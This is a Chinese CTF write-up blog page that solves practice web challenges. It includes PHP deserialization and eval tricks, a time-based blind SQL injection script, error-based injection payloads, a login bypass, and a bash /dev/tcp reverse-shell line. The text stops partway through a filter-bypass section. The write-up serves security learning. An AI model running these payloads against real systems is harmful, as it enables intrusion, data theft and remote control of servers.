@@ -1,0 +1,946 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-48x48-next.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Web," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言打比赛的时候一个变量覆盖看了半天，还是队里师傅提醒用php:&#x2F;&#x2F;input，发现自己基础很弱，于是把基础平台的Web刷了一遍，记录下一些有价值的题目。 Object考察点：PHP反序列化、一些小trick 源码： 1234567891011121314151617181920212223242526272829 &lt;?phperror_reporting(0);&#x2F;&#x2F;flag在flag.ph">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一些基础题">
+<meta property="og:url" content="https://www.sketchplane.top/2019/09/02/%E4%B8%80%E4%BA%9B%E5%9F%BA%E7%A1%80%E9%A2%98/index.html">
+<meta property="og:site_name" content="sketch_pl4ne">
+<meta property="og:description" content="前言打比赛的时候一个变量覆盖看了半天，还是队里师傅提醒用php:&#x2F;&#x2F;input，发现自己基础很弱，于是把基础平台的Web刷了一遍，记录下一些有价值的题目。 Object考察点：PHP反序列化、一些小trick 源码： 1234567891011121314151617181920212223242526272829 &lt;?phperror_reporting(0);&#x2F;&#x2F;flag在flag.ph">
+<meta property="og:image" content="https://i.loli.net/2019/09/03/I4aGoQj7XtukmH9.png">
+<meta property="og:image" content="https://t1.picb.cc/uploads/2019/09/03/gpiteM.png">
+<meta property="og:image" content="https://t1.picb.cc/uploads/2019/09/03/gpiZht.png">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/6949366-5e79b4a4e6495c2d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/601">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/6949366-d69c0869465af6de.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/601">
+<meta property="og:image" content="https://t1.picb.cc/uploads/2019/09/03/gpiHwL.png">
+<meta property="og:image" content="https://t1.picb.cc/uploads/2019/09/03/gpirAW.png">
+<meta property="og:image" content="https://t1.picb.cc/uploads/2019/09/03/gpi5Fw.png">
+<meta property="og:image" content="https://t1.picb.cc/uploads/2019/09/03/gpiAJR.png">
+<meta property="og:image" content="https://t1.picb.cc/uploads/2019/09/03/gpiM48.png">
+<meta property="article:published_time" content="2019-09-02T15:39:56.000Z">
+<meta property="article:modified_time" content="2019-09-03T02:35:46.347Z">
+<meta property="article:author" content="sketch_pl4ne">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2019/09/03/I4aGoQj7XtukmH9.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://www.sketchplane.top/2019/09/02/一些基础题/"/>
+
+
+
+
+
+  <title>一些基础题 | sketch_pl4ne</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?efbba552aa6e43dbec35569bd35c0ef6";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="sketch_pl4ne" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">sketch_pl4ne</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://www.sketchplane.top/2019/09/02/%E4%B8%80%E4%BA%9B%E5%9F%BA%E7%A1%80%E9%A2%98/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="sketch_pl4ne">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="sketch_pl4ne">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">一些基础题</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-09-02T23:39:56+08:00">
+                2019-09-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i> 阅读数
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>次
+            </span>
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2.9k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  14
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>打比赛的时候一个变量覆盖看了半天，还是队里师傅提醒用php://input，发现自己基础很弱，于是把基础平台的Web刷了一遍，记录下一些有价值的题目。</p>
+<h2 id="Object"><a href="#Object" class="headerlink" title="Object"></a>Object</h2><p><strong>考察点：PHP反序列化、一些小trick</strong></p>
+<p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//flag在flag.php里</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $cmd=<span class="string">'index.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/\w+\((?R)?\)/'</span>, <span class="keyword">$this</span>-&gt;cmd))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">'$a="'</span>.<span class="keyword">$this</span>-&gt;cmd.<span class="string">'";'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hack!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'fl'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'ag'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(@highlight_file(<span class="string">'index.php'</span>,<span class="keyword">true</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!(preg_match(<span class="string">'/[A-Za-z0-9]+\(/i'</span>, $_GET[<span class="string">'fl'</span>]))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'hack!!!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> unserialize($_GET[<span class="string">'ag'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>思路非常清晰：fl绕过正则、ag传序列化对象并绕过正则；重写$this-&gt;cmd执行命令。</strong></p>
+<p>但是这里面有几个需要注意的地方：</p>
+<ul>
+<li>ag正则的递归匹配</li>
+<li>eval()的字符拼接</li>
+<li>echo unserialize()报错问题</li>
+</ul>
+<p>ag的递归匹配限制了我们传进去的函数不能有参数，当然，能够函数套函数；eval(‘$a=”…you_payload…”;’)</p>
+<p>需要我们构造语句进行拼接；像echo unserialize($_GET[‘a’])这种反序列化一般都是调用<code>__toString()</code>方法的，用__destruct()的话在本地会报错，我在本地删掉echo或者用 __toString()方法都能正常执行命令，但是题目环境就不行。。另外这里感谢<strong>@南溟</strong>师傅的指点hhh。</p>
+<p><code>payload：?fl=php(&amp;ag=O:4:&quot;flag&quot;:1:{s:3:&quot;cmd&quot;;s:57:&quot;print_r&quot;;$a(file_get_contents(getcwd().&quot;/flag.php&quot;));$b=&quot;&quot;;&quot;}</code></p>
+<p><strong>PS：这里由于不能给函数传参，从手册中查了一个获取当前目录的getcwd()函数，然后拼接出flag.php的绝对路径。</strong></p>
+<h2 id="Dynamic"><a href="#Dynamic" class="headerlink" title="Dynamic"></a>Dynamic</h2><p><strong>考察点：PHP动态函数执行</strong></p>
+<p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$blacklist = [<span class="string">"system"</span>, <span class="string">"ini_set"</span>, <span class="string">"exec"</span>, <span class="string">"scandir"</span>, <span class="string">"shell_exec"</span>, <span class="string">"proc_open"</span>, <span class="string">"error_log"</span>, <span class="string">"ini_alter"</span>, <span class="string">"ini_set"</span>, <span class="string">"pfsockopen"</span>, <span class="string">"readfile"</span>, <span class="string">"echo"</span>, <span class="string">"file_get_contents"</span>, <span class="string">"readlink"</span>, <span class="string">"symlink"</span>, <span class="string">"popen"</span>, <span class="string">"fopen"</span>, <span class="string">"file"</span>, <span class="string">"fpassthru"</span>];</span><br><span class="line">$blacklist = array_merge($blacklist, get_defined_functions()[<span class="string">'internal'</span>]);</span><br><span class="line"><span class="keyword">foreach</span>($blacklist <span class="keyword">as</span> $i)&#123;</span><br><span class="line">    <span class="keyword">if</span>(stristr($_GET[cmd], $i)!==<span class="keyword">false</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'hack'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>($_GET[cmd]);</span><br></pre></td></tr></table></figure>
+
+<p>注意到可以命令执行，但是有黑名单，黑名单绕过姿势很多，关键是<code>$blacklist = array_merge($blacklist, get_defined_functions()[&#39;internal&#39;]);</code>这句，把内置函数都给加进黑名单了。。。</p>
+<p>正好最近P神在<code>Kcon</code>上演讲的内容就是<code>php的动态特性</code>，之前也看到过他写的类似文章，这里直接写payload：</p>
+<p><code>payload：?cmd=$a=&#39;php&#39;.&#39;info&#39;;$a();</code></p>
+<h2 id="INSERT-INTO注入"><a href="#INSERT-INTO注入" class="headerlink" title="INSERT INTO注入"></a>INSERT INTO注入</h2><p><strong>考察点：时间注入脚本编写</strong></p>
+<p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getIp</span><span class="params">()</span></span>&#123;</span><br><span class="line">$ip = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]))&#123;</span><br><span class="line">$ip = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">&#125;</span><br><span class="line">$ip_arr = explode(<span class="string">','</span>, $ip);</span><br><span class="line"><span class="keyword">return</span> $ip_arr[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$host=<span class="string">"localhost"</span>;</span><br><span class="line">$user=<span class="string">""</span>;</span><br><span class="line">$pass=<span class="string">""</span>;</span><br><span class="line">$db=<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">$connect = mysql_connect($host, $user, $pass) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to connect"</span>);</span><br><span class="line"></span><br><span class="line">mysql_select_db($db) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to select database"</span>);</span><br><span class="line"></span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'your ip is :'</span>.$ip;</span><br><span class="line">$sql=<span class="string">"insert into client_ip (ip) values ('$ip')"</span>;</span><br><span class="line">mysql_query($sql);</span><br></pre></td></tr></table></figure>
+
+<p>发现是XFF注入，另外过滤了”,”。</p>
+<p>由于输入什么都没有回显，这里尝试时间盲注，发现可行；逗号过滤用<code>from for</code>代替，直接上脚本。</p>
+<p>脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding: utf-8 --</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://123.206.87.240:8002/web15/"</span></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆破长度</span></span><br><span class="line">max_length = <span class="number">100</span></span><br><span class="line"><span class="comment"># 字符集合</span></span><br><span class="line">character = string.ascii_letters + string.digits + string.punctuation</span><br><span class="line"><span class="comment"># 数据库名</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="comment"># 遍历每一个字符</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, max_length):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> character:</span><br><span class="line">        xff = <span class="string">"1' and case when substr((select flag from flag) from %d for 1)='%s'  then sleep(5) else 1 end and '1'='1"</span> % (i, c)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            header = &#123;<span class="string">'X-Forwarded-For'</span>: xff&#125;</span><br><span class="line">            s.get(url, headers=header, timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">            flag += c</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>PS：盲注时先手工判断语句与回显再编写脚本。</strong></p>
+<h2 id="这是一个神奇的登陆框"><a href="#这是一个神奇的登陆框" class="headerlink" title="这是一个神奇的登陆框"></a>这是一个神奇的登陆框</h2><p><strong>考察点：报错注入</strong></p>
+<p>先在admin_user测试，发现双引号时admin_passwd报错，于是在admin_passwd处利用报错注入：</p>
+<p>比较实用的几种报错注入方法：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and updatexml(1,concat('~',(your_payload),'~'),3) <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and exp(~(<span class="keyword">select</span> * <span class="keyword">from</span> (your_payload) a) ); <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(((your_payload)),<span class="keyword">floor</span> (<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a) <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>注意：超过一行时用 <code>payload LIMIT 0,1</code>逐个查询</strong></p>
+<p><code>payload：admin_name=admin
+&amp;admin_passwd=123456&quot; and updatexml(1,concat(&#39;~&#39;,(select database()),&#39;~&#39;),3) #</code></p>
+<p><strong>PS：以上三条都能打</strong></p>
+<h2 id="PHP-encrypt-1"><a href="#PHP-encrypt-1" class="headerlink" title="PHP_encrypt_1"></a>PHP_encrypt_1</h2><p>加密脚本：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span><span class="params">($data,$key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $key = md5(<span class="string">'ISCC'</span>);</span><br><span class="line">    $x = <span class="number">0</span>;</span><br><span class="line">    $len = strlen($data);</span><br><span class="line">    $klen = strlen($key);<span class="comment">//$klen=32</span></span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $len; $i++) &#123; </span><br><span class="line">        <span class="keyword">if</span> ($x == $klen) <span class="comment">//如果$x=32</span></span><br><span class="line">        &#123;</span><br><span class="line">            $x = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $char .= $key[$x];</span><br><span class="line">        $x+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $len; $i++) &#123;</span><br><span class="line">        $str .= chr((ord($data[$i]) + ord($char[$i])) % <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> base64_encode($str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>意思就是生成与明文长度相等的密钥流，然后对应位加密。</p>
+<p>解密脚本：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span><span class="params">($crypt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$crypt = base64_decode($crypt);</span><br><span class="line">	$len = strlen($crypt);</span><br><span class="line">	$key = md5(<span class="string">'ISCC'</span>);</span><br><span class="line">	$klen = strlen($key);</span><br><span class="line">	$char = <span class="string">""</span>;</span><br><span class="line">	$str = <span class="string">""</span>;</span><br><span class="line">	$x = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $len; $i++) &#123; </span><br><span class="line">        <span class="keyword">if</span> ($x == $klen) <span class="comment">//如果$x=32</span></span><br><span class="line">        &#123;</span><br><span class="line">            $x = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $char .= $key[$x];</span><br><span class="line">        $x += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;$len;$i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(ord($crypt[$i]) &gt;= ord($char[$i]))&#123;</span><br><span class="line">			$str .= chr((ord($crypt[$i])-ord($char[$i])));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(ord($crypt[$i]) &lt; ord($char[$i]))&#123;</span><br><span class="line">			$str .= chr((ord($crypt[$i])+<span class="number">128</span>-ord($char[$i])));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">print</span>($str);	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">decrypt(<span class="string">"fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA="</span>);</span><br></pre></td></tr></table></figure>
+
+<p><strong>PS：题目给出了密文</strong></p>
+<h2 id="login2-SKCTF"><a href="#login2-SKCTF" class="headerlink" title="login2(SKCTF)"></a>login2(SKCTF)</h2><p><strong>考察点：union_md5()、命令执行反弹shell</strong></p>
+<p>在响应头中发现Hint：</p>
+<p><img src="https://i.loli.net/2019/09/03/I4aGoQj7XtukmH9.png" alt="Snipaste_2019-09-03_08-28-47.png"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT username,password FROM admin WHERE username='"</span>.$username.<span class="string">"'"</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($row) &amp;&amp; $row[<span class="string">'password'</span>]===md5($password))&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>构造语句：<code>submit=Login&amp;username=admin&#39; union select 1,md5(1)#&amp;password=1</code></p>
+<p>然后进入命令执行页面，输入反弹shell语句：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> VPS：</span></span><br><span class="line">nc -lvp 6666</span><br><span class="line"><span class="meta">#</span><span class="bash"> 命令执行点：</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<h2 id="login3-SKCTF"><a href="#login3-SKCTF" class="headerlink" title="login3(SKCTF)"></a>login3(SKCTF)</h2><p><strong>考察点：各种过滤、异或盲注</strong></p>
+<p>人工fuzz，发现过滤了空格、逗号、and、or、–+、union。</p>
+<h3 id="空格被过滤"><a href="#空格被过滤" class="headerlink" title="空格被过滤"></a>空格被过滤</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**/</span></span><br><span class="line">()</span><br><span class="line">%0a</span><br><span class="line">+</span><br></pre></td></tr></table></figure>
+
+<p>这里发现可以用括号，另外需要注意or被过滤，这表示inf<strong>or</strong>mation_schema已经不能用了，最重要的是我们不能用 substr(“payload” from f<strong>or</strong>)来截取字符串了。</p>
+<p>这里我们需要用到<code>ascii()</code>函数的一个特性：<code>ascii()</code><strong>在处理字符串时会返回第一个字符的ascii码</strong>，这样我们就能fuzz出每一个字符。</p>
+<p>在编写脚本前先观察页面回显：</p>
